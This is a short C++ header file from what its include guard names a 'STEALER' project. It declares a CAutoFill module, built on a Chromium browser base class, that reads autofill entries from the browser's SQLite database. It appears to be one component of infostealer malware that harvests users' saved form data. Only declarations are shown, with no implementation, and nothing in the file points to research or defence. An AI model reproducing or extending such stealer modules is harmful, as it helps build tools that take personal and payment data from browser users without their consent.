//
// Created by .1qxz on 09.06.2024.
//

#ifndef STEALER_CAUTOFILL_H
#define STEALER_CAUTOFILL_H


#include "../ChromiumBrowserModule.h"
#include "../../../../../utils/SQLiteUtil.h"

class CAutoFill : public ChromiumBrowserModule {
public:
    void execute(const fs::path &root, const std::string &name, const fs::path &browser_root) override;
private:
    static std::list<AutoFill> getAutoFill(const fs::path &db_path);
};


#endif //STEALER_CAUTOFILL_H
